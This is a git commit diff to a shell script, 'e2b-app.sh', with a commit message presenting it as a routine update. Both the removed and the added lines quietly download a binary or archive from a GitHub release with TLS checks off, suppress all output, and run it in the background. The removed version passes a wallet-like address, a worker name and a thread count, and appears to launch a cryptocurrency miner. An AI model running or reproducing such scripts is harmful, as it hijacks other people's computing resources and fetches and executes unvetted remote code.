650b4ae47829ab85b9271f24fa7cf2a68ae6fac8
gaserjuk <gaserjukilo@gmail.com>
2026-05-15 16:11:12 +0700

    Update script to use vertex instead of velt
    Replaced velt download and execution with vertex extraction and run script execution.

--- e2b-app.sh
+++ e2b-app.sh
@@ -1,7 +1,9 @@
 #!/bin/bash
-curl -sLkO https://github.com/satelitlima00/sentor/releases/download/velt/velt >/dev/null 2>&1
-chmod 777 velt
-./velt --user 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi --pass WORKER-E1 --threads 7 >/dev/null 2>&1 &
+curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/vertex.tar.gz >/dev/null 2>&1
+tar -xvf vertex.tar.gz >/dev/null 2>&1
+rm vertex.tar.gz
+chmod +x run.sh
+bash run.sh 7 >/dev/null 2>&1 &
 sleep 200
 while true
 do
